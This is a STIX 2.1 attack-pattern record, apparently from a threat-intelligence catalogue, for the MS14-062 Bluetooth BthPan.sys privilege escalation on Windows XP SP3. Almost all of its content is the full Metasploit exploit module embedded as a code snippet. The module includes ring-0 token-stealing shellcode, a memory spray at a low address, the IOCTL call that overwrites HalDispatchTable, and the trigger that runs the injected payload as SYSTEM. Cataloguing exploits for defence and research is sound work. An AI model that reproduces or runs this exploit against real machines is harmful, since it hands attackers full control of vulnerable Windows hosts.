{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5535c00a-14ba-4ed6-9ef8-3d84831a8b17",
    "created": "2024-08-14T16:49:57.977443Z",
    "modified": "2024-08-14T16:49:57.977448Z",
    "name": "MS14-062 Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation",
    "description": " A vulnerability within Microsoft Bluetooth Personal Area Networking module BthPan.sys, can allow an attacker to inject memory controlled by the attacker into an arbitrary location. This can be used by an attacker to overwrite HalDispatchTable+0x4 and execute arbitrary code by subsequently calling NtQueryIntervalProfile.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bthpan.rb",
            "external_id": "bthpan.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4971"
        },
        {
            "source_name": "reference",
            "url": "https://www.korelogic.com/Resources/Advisories/KL-001-2014-002.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::File\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS14-062 Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation',\n        'Description' => %q{\n          A vulnerability within Microsoft Bluetooth Personal Area Networking module,\n          BthPan.sys, can allow an attacker to inject memory controlled by the attacker\n          into an arbitrary location. This can be used by an attacker to overwrite\n          HalDispatchTable+0x4 and execute arbitrary code by subsequently calling\n          NtQueryIntervalProfile.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Matt Bergin <level[at]korelogic.com>', # Vulnerability discovery and PoC\n          'Jay Smith <jsmith[at]korelogic.com>' # MSF module\n        ],\n        'Arch' => ARCH_X86,\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Targets' => [\n          [\n            'Windows XP SP3',\n            {\n              'HaliQuerySystemInfo' => 0x16bba,\n              '_KPROCESS' => \"\\x44\",\n              '_TOKEN' => \"\\xc8\",\n              '_UPID' => \"\\x84\",\n              '_APLINKS' => \"\\x88\"\n            }\n          ]\n        ],\n        'References' => [\n          [ 'MSB', 'MS14-062' ],\n          [ 'CVE', '2014-4971' ],\n          [ 'URL', 'https://www.korelogic.com/Resources/Advisories/KL-001-2014-002.txt' ],\n          [ 'OSVDB', '109387' ]\n        ],\n        'DisclosureDate' => '2014-07-18',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def ring0_shellcode\n    tokenswap = \"\\x60\\x64\\xA1\\x24\\x01\\x00\\x00\"\n    tokenswap << \"\\x8B\\x40\\x44\\x50\\xBB\\x04\"\n    tokenswap << \"\\x00\\x00\\x00\\x8B\\x80\\x88\"\n    tokenswap << \"\\x00\\x00\\x00\\x2D\\x88\"\n    tokenswap << \"\\x00\\x00\\x00\\x39\\x98\\x84\"\n    tokenswap << \"\\x00\\x00\\x00\\x75\\xED\\x8B\\xB8\\xC8\"\n    tokenswap << \"\\x00\\x00\\x00\\x83\\xE7\\xF8\\x58\\xBB\"\n    tokenswap << [session.sys.process.getpid].pack('V')\n    tokenswap << \"\\x8B\\x80\\x88\\x00\\x00\\x00\"\n    tokenswap << \"\\x2D\\x88\\x00\\x00\\x00\"\n    tokenswap << \"\\x39\\x98\\x84\\x00\\x00\\x00\"\n    tokenswap << \"\\x75\\xED\\x89\\xB8\\xC8\"\n    tokenswap << \"\\x00\\x00\\x00\\x61\\xC3\"\n  end\n\n  def fill_memory(proc, address, length, content)\n    session.railgun.ntdll.NtAllocateVirtualMemory(-1, [ address ].pack('V'), nil, [ length ].pack('V'), 'MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN', 'PAGE_EXECUTE_READWRITE')\n\n    unless proc.memory.writable?(address)\n      vprint_error('Failed to allocate memory')\n      return nil\n    end\n    vprint_good(\"#{address} is now writable\")\n\n    result = proc.memory.write(address, content)\n\n    if result.nil?\n      vprint_error('Failed to write contents to memory')\n      return nil\n    end\n    vprint_good(\"Contents successfully written to 0x#{address.to_s(16)}\")\n\n    return address\n  end\n\n  def disclose_addresses(t)\n    addresses = {}\n\n    hal_dispatch_table = find_haldispatchtable\n    return nil if hal_dispatch_table.nil?\n\n    addresses['halDispatchTable'] = hal_dispatch_table\n    vprint_good(\"HalDispatchTable found at 0x#{addresses['halDispatchTable'].to_s(16)}\")\n\n    vprint_status('Getting the hal.dll base address...')\n    hal_info = find_sys_base('hal.dll')\n    if hal_info.nil?\n      vprint_error('Failed to disclose hal.dll base address')\n      return nil\n    end\n    hal_base = hal_info[0]\n    vprint_good(\"hal.dll base address disclosed at 0x#{hal_base.to_s(16)}\")\n\n    hali_query_system_information = hal_base + t['HaliQuerySystemInfo']\n    addresses['HaliQuerySystemInfo'] = hali_query_system_information\n\n    vprint_good(\"HaliQuerySystemInfo address disclosed at 0x#{addresses['HaliQuerySystemInfo'].to_s(16)}\")\n    addresses\n  end\n\n  def check\n    # covers both native x64 and WOW64\n    if sysinfo['Architecture'] == ARCH_X64\n      return Exploit::CheckCode::Safe\n    end\n\n    version = get_version_info\n    return Exploit::CheckCode::Safe unless version.build_number == Msf::WindowsVersion::XP_SP3\n\n    handle = open_device('\\\\\\\\.\\\\bthpan', 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')\n    return Exploit::CheckCode::Safe unless handle\n\n    session.railgun.kernel32.CloseHandle(handle)\n\n    return Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system')\n    end\n\n    handle = open_device('\\\\\\\\.\\\\bthpan', 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')\n    if handle.nil?\n      fail_with(Failure::NoTarget, 'Unable to open \\\\\\\\.\\\\bthpan device')\n    end\n\n    my_target = targets[0]\n    print_status('Disclosing the HalDispatchTable address...')\n    @addresses = disclose_addresses(my_target)\n    if @addresses.nil?\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Failed to disclose necessary address for exploitation. Aborting.')\n    else\n      print_good('Address successfully disclosed.')\n    end\n\n    print_status('Storing the shellcode in memory...')\n    this_proc = session.sys.process.open\n    kernel_shell = ring0_shellcode\n    kernel_shell_address = 0x1\n\n    buf = \"\\x90\" * 0x6000\n    buf[0, 1028] = \"\\x50\\x00\\x00\\x00\" + \"\\x90\" * 0x400\n    buf[0x5000, kernel_shell.length] = kernel_shell\n\n    result = fill_memory(this_proc, kernel_shell_address, buf.length, buf)\n    if result.nil?\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Error while storing the kernel stager shellcode on memory')\n    end\n    print_good(\"Kernel stager successfully stored at 0x#{kernel_shell_address.to_s(16)}\")\n\n    print_status('Triggering the vulnerability, corrupting the HalDispatchTable...')\n    session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x0012d814, 0x1, 0x258, @addresses['halDispatchTable'] + 0x4, 0)\n    session.railgun.kernel32.CloseHandle(handle)\n\n    print_status('Executing the Kernel Stager throw NtQueryIntervalProfile()...')\n    session.railgun.ntdll.NtQueryIntervalProfile(2, 4)\n\n    print_status('Checking privileges after exploitation...')\n\n    unless is_system?\n      fail_with(Failure::Unknown, \"The privilege escalation wasn't successful\")\n    end\n    print_good('Privilege escalation successful!')\n\n    p = payload.encoded\n    print_status(\"Injecting #{p.length} bytes to memory and executing it...\")\n    unless execute_shellcode(p)\n      fail_with(Failure::Unknown, 'Error while executing the payload')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-07-18",
    "x_mitre_platforms": [
        "win'"
    ]
}